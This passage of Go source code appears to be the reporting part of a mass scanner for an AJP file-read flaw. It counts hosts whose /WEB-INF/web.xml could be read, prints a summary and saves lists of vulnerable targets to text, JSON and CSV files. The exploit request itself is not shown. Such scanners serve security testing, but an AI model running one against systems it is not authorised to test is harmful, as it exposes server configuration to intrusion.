			vulnCount++
			key := fmt.Sprintf("%s:%d", r.Host, r.Port)
			if _, exists := vulnSet[key]; !exists {
				vulnSet[key] = VulnTarget{
					Host:            r.Host,
					Port:            r.Port,
					FilePath:        "/WEB-INF/web.xml",
					BodyLength:      r.BodyLength,
					ResponseTimeMs:  r.TookMs,
					FoundAt:         r.Timestamp,
				}
			}
		} else {
			openCount++
		}

		// Write to output file
		if outWriter != nil {
			status := "CLOSED"
			if r.Error == "" && !r.Vulnerable {
				status = "OPEN_SAFE"
			} else if r.Vulnerable {
				status = "VULNERABLE"
			} else if !strings.Contains(r.Error, "port closed") {
				status = "ERROR"
			}
			line := fmt.Sprintf("%s:%d\t%s\t%d\t%dms\t%s\n", r.Host, r.Port, status, r.BodyLength, r.TookMs, r.Error)
			outWriter.WriteString(line)
		}

		// Write to CSV
		if csvWriter != nil {
			status := "CLOSED"
			if r.Error == "" && !r.Vulnerable {
				status = "OPEN_SAFE"
			} else if r.Vulnerable {
				status = "VULNERABLE"
			} else if !strings.Contains(r.Error, "port closed") {
				status = "ERROR"
			}

			errorStr := strings.ReplaceAll(r.Error, ",", ";")
			errorStr = strings.ReplaceAll(errorStr, "\n", " ")
			fmt.Fprintf(csvWriter, "%s,%d,%s,%d,%d,%d,%s\n",
				r.Host, r.Port, status, r.StatusCode, r.BodyLength, r.TookMs, errorStr)
		}
	}

	// Summary
	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
	fmt.Printf("  %s📊 Scan Summary:%s\n", clrBold, clrReset)
	fmt.Printf("    %s🔴 Vulnerable:      %d%s\n", clrRed, vulnCount, clrReset)
	fmt.Printf("    %s🟢 Open (safe):     %d%s\n", clrGreen, openCount, clrReset)
	fmt.Printf("    %s⚫ Closed/Filtered: %d%s\n", clrDim, closedCount, clrReset)
	if errCount > 0 {
		fmt.Printf("    %s🟡 Errors:          %d%s\n", clrYellow, errCount, clrReset)
	}

	// Print vulnerable targets summary
	if len(vulnSet) > 0 {
		fmt.Printf("\n  %s📁 Vulnerable Targets Found: %d%s\n", clrRed, len(vulnSet), clrReset)
		fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", clrSurface1, clrReset)
		fmt.Printf("  %s%-35s %sStatus%s\n", clrBold, "Target", clrReset, clrReset)
		for key, v := range vulnSet {
			fmt.Printf("  %s⚠ %-33s %sVULNERABLE (AJP %d, %d bytes)%s\n",
				clrRed, key, clrReset, v.Port, v.BodyLength, clrReset)
		}
		fmt.Println()
	}

	// Save vulnerable targets to text file
	if vulnFile != "" {
		var targetsList []VulnTarget
		for _, v := range vulnSet {
			targetsList = append(targetsList, v)
		}
		if err := saveVulnTargetsToText(targetsList, vulnFile); err != nil {
			fmt.Printf("  %sError:%s Cannot save vuln file: %v\n", clrRed, clrReset, err)
		} else {
			fmt.Printf("  %s✓%s Vulnerable targets saved to: %s%s%s\n", clrGreen, clrReset, clrYellow, vulnFile, clrReset)
		}
	}

	// Save vulnerable targets to JSON
	if jsonFile != "" {
		var targetsList []VulnTarget
		for _, v := range vulnSet {
			targetsList = append(targetsList, v)
		}
		if err := saveVulnTargetsToJSON(targetsList, jsonFile); err != nil {
			fmt.Printf("  %sError:%s Cannot save JSON file: %v\n", clrRed, clrReset, err)
		} else {
			fmt.Printf("  %s✓%s JSON report saved to: %s%s%s\n", clrGreen, clrReset, clrYellow, jsonFile, clrReset)
		}
	}

	// Save all results
	if outputFile != "" {
		if err := saveAllResults(allResults, len(targets), vulnCount, outputFile); err != nil {
			fmt.Printf("  %sError:%s Cannot save results: %v\n", clrRed, clrReset, err)
		} else {
			fmt.Printf("  %s✓%s All results saved to: %s%s%s\n", clrGreen, clrReset, clrYellow, outputFile, clrReset)
		}
	}

	// CSV is already written, just confirm
	if csvFile != "" {
		fmt.Printf("  %s✓%s CSV report saved to: %s%s%s\n", clrGreen, clrReset, clrYellow, csvFile.Name(), clrReset)
	}

	fmt.Println()
}
